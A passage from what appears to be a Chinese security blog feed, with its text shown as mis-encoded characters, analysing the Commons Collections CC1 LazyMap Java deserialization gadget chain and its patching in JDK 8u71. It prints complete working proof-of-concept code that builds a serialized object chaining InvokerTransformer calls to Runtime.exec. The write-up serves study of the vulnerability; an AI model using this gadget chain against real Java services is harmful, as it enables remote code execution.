0</code>åˆ™æŠ›å‡ºAssertionErrorå¼‚å¸¸ã€‚å³ä¸èƒ½è°ƒç”¨æœ‰å‚æ–¹æ³•ã€‚åªè¦ä¸æ˜¯è°ƒç”¨ä»¥ä¸Šåå­—æ–¹æ³•ï¼Œéƒ½èƒ½æˆåŠŸæ‰§è¡Œã€‚</p><p>ä»£ç†ç±»åªèƒ½ä»£ç†æ„é€ å‡½æ•°ä¼ å…¥çš„ç±»ï¼Œåœ¨è¿™é‡Œå°±æ˜¯ç»§æ‰¿äº†Annotationæ¥å£çš„ç±»ï¼ˆå³æ³¨è§£ï¼‰ï¼Œå’Œå®ç°äº†Mapæ¥å£çš„ç±»ã€‚</p><p>æ‰€ä»¥å“ªä¸ªæ³¨è§£ç±»æˆ–å®ç°äº†Mapæ¥å£çš„ç±»åœ¨readObjectè°ƒç”¨äº†æ— å‚æ–¹æ³•å‘¢ï¼Ÿå°±æ˜¯ä»–æœ¬èº«</p><p>AnnotationInvocationHandleræœ¬èº«çš„readObjecté‡Œè°ƒç”¨äº†mapçš„ä¸€ä¸ªæ— å‚æ–¹æ³•</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713230626575.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713230626575.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬ç”¨AnnotationInvocationHandlerä»£ç†lazyMapï¼Œè°ƒç”¨è¿™ä¸ªä»£ç†å®ä¾‹çš„entrySetæ–¹æ³•ï¼Œå°±èƒ½è·³è½¬åˆ°invokeæ–¹æ³•ï¼Œè¿›è€Œè°ƒç”¨getã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">InvocationHandler</span> <span class="variable">ProxyInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"><span class="type">Map</span> <span class="variable">ProxylazyMap</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line">ProxylazyMap.entrySet();</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ç”¨AnnotationInvocationHandler#readObjectå»è§¦å‘entrySet()</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line"><span class="comment">//        ProxylazyMap.entrySet();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713233221047.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240713233221047.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å®Œæ•´ä»£ç ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1LazyMap</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc.exe&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        HashMap&lt;Object, Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">ProxyInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,ProxyInvocationHandler);</span><br><span class="line"><span class="comment">//        ProxylazyMap1.entrySet();</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileOutputStream(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        java.io.<span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectOutputStream(fos);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(String Filename)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        java.io.<span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.FileInputStream(Filename);</span><br><span class="line">        java.io.<span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.ObjectInputStream(fis);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è°ƒç”¨é“¾å¦‚ä¸‹ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-&gt;AnnotationInvocationHandler.readObject()</span><br><span class="line">      -&gt;ProxyLaztMap.entrySet()</span><br><span class="line">          -&gt;AnnotationInvocationHandler.invoke()</span><br><span class="line">            -&gt;LazyMap.get()</span><br><span class="line">                -&gt;ChainedTransformer.transform()</span><br><span class="line">                -&gt;ConstantTransformer.transform()</span><br><span class="line">                    -&gt;InvokerTransformer.transform()</span><br></pre></td></tr></table></figure><p>å…¶å®åˆ°AnnotationInvocationHandler.invoke()äº†ï¼Œéšä¾¿æ‰¾ä¸€ä¸ªç±»ï¼ŒreadObjecté‡Œå«æœ‰è°ƒç”¨mapæ— å‚æ–¹æ³•ã€‚éƒ½èƒ½å®Œæˆæœ¬æ¡é“¾ï¼Œæˆ–è€…å¦å¤–æ‰¾åœ°æ–¹è§¦å‘LazyMap.get()ï¼Œæ¯•ç«Ÿè°ƒç”¨getçš„åœ°æ–¹é‚£ä¹ˆå¤šã€‚</p><p>åé¢æˆ‘ä»¬ç¡®å®ä¹Ÿèƒ½çœ‹åˆ°ï¼Œç”±äºAnnotationInvocationHandleræ˜¯å±äºsun.reflect.annotationåŒ…ï¼Œåœ¨8u71ç‰ˆæœ¬å¯¹è¯¥ç±»è¿›è¡Œäº†ä¿®æ”¹ã€‚</p><h3 id="8u71ä¸­å¯¹AnnotationInvocationHandler-readObjectçš„ä¿®å¤"><a href="#8u71ä¸­å¯¹AnnotationInvocationHandler-readObjectçš„ä¿®å¤" class="headerlink" title="8u71ä¸­å¯¹AnnotationInvocationHandler#readObjectçš„ä¿®å¤"></a>8u71ä¸­å¯¹AnnotationInvocationHandler#readObjectçš„ä¿®å¤</h3><p>è¿™éƒ¨åˆ†æœ‰ä¸€ç‚¹ç»•ï¼Œæˆ‘ä»¬é€æ­¥åˆ†æã€‚æ­£æ˜¯å› ä¸ºè¿‡äºéš¾ç†è§£ï¼Œæ‰æ˜¯å…¨ç½‘æ²¡å‡ ä¸ªäººåˆ†æçš„åŸå› å§ã€‚å¯è·³è¿‡</p><p>å·æ‡’8u71sunåŒ…é“¾æ¥<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/tip.zip">https://hg.openjdk.org/jdk8u/jdk8u/jdk/archive/tip.zip</a></p><p>æˆ‘ä»¬åŒæ ·çš„ä»£ç åœ¨jdk8u71ä¸‹ä¼šæŠ¥Override missing element entrySeté”™è¯¯ï¼Œä¸”ä¸å¼¹è®¡ç®—å™¨ã€‚å…¶å®æŠ¥é”™ï¼ŒLayzMapé“¾å¤±æ•ˆï¼ŒTransformedMapé“¾å¤±æ•ˆï¼Œæ˜¯ä¸‰ä¸ªä¸åŒçš„é—®é¢˜ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235448070.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235448070.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘ä»¬diffä¸€ä¸‹8u71å’Œ8u65çš„AnnotationInvocationHandlerçš„åŒºåˆ«</p><p>å‘ç°readObjectä»é»˜è®¤çš„defaultReadObjectå˜æˆäº†readFields()ã€‚æœ‰çš„äººä»¥ä¸ºè¿™é‡Œå°±æ˜¯ä¿®å¤äº†ã€‚å®åˆ™è¿™ä¸¤ä¸ªæ²¡åŒºåˆ«ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716104945152.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716104945152.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>åœ¨è°ƒç”¨ s.readFields() æ—¶ï¼ŒObjectInputStream å®é™…ä¸Šå°±å·²ç»å¼€å§‹è¯»å–å¹¶è§£æè¾“å…¥æµä¸­çš„æ•°æ®ï¼Œå°†å¯¹è±¡çš„å­—æ®µçŠ¶æ€ååºåˆ—åŒ–ã€‚è¿™ä¸ªæ–¹æ³•ä¼šè¯»å–æ‰€æœ‰åºåˆ—åŒ–çš„å­—æ®µï¼Œå¹¶å°†å®ƒä»¬å­˜å‚¨åœ¨ä¸€ä¸ª GetField å¯¹è±¡ä¸­ã€‚GetField å¯¹è±¡å……å½“äº†ä¸€ä¸ªæ˜ å°„è¡¨ï¼Œå…¶ä¸­åŒ…å«äº†æ‰€æœ‰å¯åºåˆ—åŒ–å­—æ®µçš„åç§°åŠå…¶å¯¹åº”çš„å€¼ã€‚<br>å½“ä½ éšåè°ƒç”¨ fields.get(â€œfieldNameâ€, defaultValue) æ¥è·å–æŸä¸ªå­—æ®µçš„å€¼æ—¶ï¼Œå®é™…ä¸Šæ˜¯ä»ä¹‹å‰å·²ç»ååºåˆ—åŒ–å¹¶å­˜å‚¨åœ¨ GetField å¯¹è±¡ä¸­çš„æ•°æ®ä¸­æ£€ç´¢è¿™ä¸ªå€¼ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œååºåˆ—åŒ–çš„è¿‡ç¨‹å‘ç”Ÿåœ¨ readFields() è¢«è°ƒç”¨æ—¶ï¼Œè€Œä¸æ˜¯åœ¨æ¯æ¬¡ get æ–¹æ³•è°ƒç”¨æ—¶ã€‚è·Ÿä¹‹å‰ç‰ˆæœ¬çš„s.defaultReadObject();æ²¡åŒºåˆ«</p><p>ç»è¿‡æˆ‘è°ƒè¯•äº†ä¸€å¤©ï¼Œä»–å¦ˆçš„ã€‚ä»€ä¹ˆè¾“å‡ºä¸­é—´ä»£ç†å®ä¾‹æ¥diffï¼Œåˆ°å¤„æ–­ç‚¹ã€‚æˆ‘è¿˜æ˜¯æ²¡æœ‰æ·±åˆ»ç†è§£åˆ°ååºåˆ—åŒ–çš„è¿‡ç¨‹ã€‚</p><blockquote><p>æˆ‘ä»–å¦ˆé—®ä¸ªå‚»é€¼GPTï¼Œé—®ä»–defaultReadObjectä¼šä¸ä¼šè‡ªåŠ¨è°ƒç”¨å¯¹è±¡ä¸‹æ¶‰åŠåˆ°çš„å…¶ä»–å¯¹è±¡çš„readObjectï¼Œä»–ä»–å¦ˆçš„ä¸€å£å’¬æ­»è¯´ä¸ä¼šã€‚ç»å…¸ä¸ä¼šæ¶‰åŠã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716143253491.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716143253491.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æˆ‘è®°å¾—å’Œæˆ‘è„‘å­é‡Œè®°å¾—ä¸å¤ªä¸€æ ·å•Šï¼Œä»€ä¹ˆreadObjecté“¾å¼è°ƒç”¨ä¹‹ç±»çš„ã€‚ç»“æœæœé›†å„ä¸ªèµ„æ–™ï¼Œå›å¿†æ¶Œä¸Šå¿ƒå¤´ã€‚</p><p>åŠ å…¥å¯¹è±¡AåŒ…å«å¯¹è±¡Bå’ŒCï¼Œä¸”Bå’ŒCéƒ½å®ç°äº†serializableæ¥å£ï¼Œå°±ä¼šè‡ªåŠ¨è°ƒç”¨Bå’ŒCçš„readObjectï¼Œä¸ç„¶defaultReadObjectååºåˆ—åŒ–æ‰€æœ‰å­—æ®µæ€ä¹ˆå¤„ç†çš„ï¼Ÿä»–è¦ååºåˆ—åŒ–ä»–å°±å¾—è§¦å‘readObjectã€‚çœŸä»–å¦ˆå‚»é€¼å•ŠGPTã€‚</p></blockquote><p>çŸ¥é“è¿™ä¸ªä¸‹é¢å°±å¾ˆå®¹æ˜“ç†è§£äº†ã€‚</p><p>æˆ‘ä»¬å‘ç°å®˜æ–¹åœ¨AnnotationInvocationHandler#readObjecté‡ŒæŠŠè°ƒç”¨è¿”å›å€¼ä¼ åˆ°UnsafeAccessor</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235314083.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714235314083.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714230029547.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714230029547.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è€ŒUnsafeAccessorçš„setMemverValueså’ŒsetTypeæ˜¯é€šè¿‡UnSafeå¯¹è±¡ï¼ˆå­¦è¿‡URLDNSé“¾çš„åŒå­¦æ¯”è¾ƒç†Ÿæ‚‰ï¼‰ç›´æ¥æ“ä½œå†…å­˜ï¼Œå°†â€memberValuesâ€å¯¹è±¡çš„å†…å­˜æ‹·è´åˆ°æŒ‡å®šå¯¹è±¡â€oâ€çš„â€memberValuesOffsetâ€åç§»ä½ç½®ä¸Šã€‚ç®€å•æ¥è¯´å°±æ˜¯ä¿®æ”¹å¯¹è±¡oçš„å¯¹åº”å­—æ®µå€¼ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714234946309.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240714234946309.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æ— è®ºæ˜¯defaultReadObject()è¿˜æ˜¯readFields()ï¼Œéƒ½ä¼šè‡ªåŠ¨è°ƒç”¨serializableåºåˆ—åŒ–æµæ¶‰åŠå¯¹è±¡çš„readObjectã€‚</p><p>ååºåˆ—åŒ–åˆ°ä»£ç 1çš„éƒ¨åˆ†æ—¶ï¼Œè°ƒç”¨AnnotationInvocationHandler#readObjectï¼Œæ­¤æ—¶çš„streamValsè¿˜åªæ˜¯lazyMapï¼Œè€Œä¸æ˜¯ä»£ç†å®ä¾‹ã€‚è€Œç”¨æ–°å»ºçš„LinkedHashMap()æ›¿æ¢äº†è¿™ä¸ªlazyMapã€‚ç­‰åˆ°ä»£ç 2è°ƒç”¨ä»£ç†å®ä¾‹çš„invokeæ–¹æ³•æ—¶ï¼ŒmemberValueså·²ç»æ˜¯LinkedHashMap()äº†ï¼Œå½“ç„¶æ— æ³•è·³è½¬åˆ°LazyMap.get()ã€‚äºŒæ¬¡è§¦å‘äº†readObejctã€‚</p><p>åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ä¿®æ”¹å­—æ®µå€¼ï¼Œè¿™å°±æ˜¯è¿™é‡Œç”¨Unsafeè¯»å–å†…å­˜ä¿®æ”¹çš„åŸå› ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ä»£ç 1</span></span><br><span class="line">Class&lt;?&gt; annotationInvocationHandlerClass = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        Constructor&lt;?&gt; annotationInvocationHandlerConstructor =annotationInvocationHandlerClass.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">annotationInvocationHandler</span> <span class="operator">=</span> (InvocationHandler) annotationInvocationHandlerConstructor.newInstance(Override.class,lazyMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//ä»£ç 2</span></span><br><span class="line">        <span class="type">Map</span> <span class="variable">ProxylazyMap1</span> <span class="operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Map.class&#125;,annotationInvocationHandler);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">ProxylazyMap2</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,ProxylazyMap1);</span><br><span class="line">        serialize(ProxylazyMap2);</span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>);</span><br></pre></td></tr></table></figure><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144006381.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144006381.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>è°ƒè¯•ä¹Ÿèƒ½çœ‹å‡ºæ¥ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144746103.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716144746103.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>æœ‰åŒå­¦å¯èƒ½ä¼šé—®ï¼šæ¬¸ï¼Œä¹‹å‰æ„é€ çš„æ—¶å€™ï¼Œå…¶ä»–ç±»çš„readObjectä¸ä¼šå½±å“æˆ‘ä»¬çš„é“¾å—ï¼Ÿ</p><p>ä¸ä¼šï¼Œå› ä¸ºProxyã€LazyMapä¹‹ç±»çš„éƒ½æ²¡æœ‰readObjectï¼Œç”¨çš„é»˜è®¤çš„ï¼ŒTransformedMapä¹Ÿæ˜¯è°ƒç”¨é»˜è®¤çš„defaultReadObejct</p><p>è‡³äºé’ˆå¯¹TransformedMapé“¾çš„ä¿®å¤ï¼Œæ˜¯å»æ‰äº†setValueæ–¹æ³•ï¼š</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145205099.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145205099.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>é‚£ä¸Šé¢çš„Override missing element entrySeté”™è¯¯æ˜¯ä»€ä¹ˆæƒ…å†µï¼Ÿ</p><p>è¿™æ˜¯å› ä¸ºä¸‹é¢çº¢æ¡†è¿™å¥ï¼Œåœ¨TransformedMapé“¾é‡Œæˆ‘ä»¬ä¸ºäº†èµ°è¿›ifï¼ŒæŠŠnameç½®ä¸ºâ€valueâ€ï¼Œå¹¶ä¸”é€‰äº†æœ‰valueæ–¹æ³•çš„Targetæ³¨è§£æ‰æ²¡æœ‰æŠ¥é”™ï¼Œè€Œåé¢æˆ‘ä»¬åªéœ€è¦èµ°è¿›entrySetå°±è§¦å‘çš„LazyMapé“¾ï¼Œnameå°±æ²¡ç®¡äº†ã€‚è¿™é‡Œå–å‡ºçš„nameæ˜¯entrySetï¼ŒOverrideå–ä¸åˆ°entrySetæ–¹æ³•ï¼Œæ‰€ä»¥æŠ¥çš„é”™ã€‚</p><p><img src="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145428601.png" class="lazyload placeholder" data-srcset="https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typora/image-20240716145428601.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp"></p><p>å¯„ï¼TransformedMapå’ŒLazyMapçš„CC1éƒ½ä¸èƒ½ç”¨äº†ã€‚</p><p>æœ‰ä»»ä½•é—®é¢˜è”ç³»æˆ‘ã€‚</p><p>å‚è€ƒé“¾æ¥ï¼š</p><p><a href="https://www.cnblogs.com/gonjan-blog/p/6685611.html">https://www.cnblogs.com/gonjan-blog/p/6685611.html</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
          <category> CC </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CC </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CCé‡å¯ä¹‹ä»é›¶ä»£ç æ„é€ TransformedMap CC1</title>
      <link href="/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/"/>
      <url>/2024/07/10/cc-chong-qi-zhi-cong-ling-dai-ma-gou-zao-cc1/</url>
      
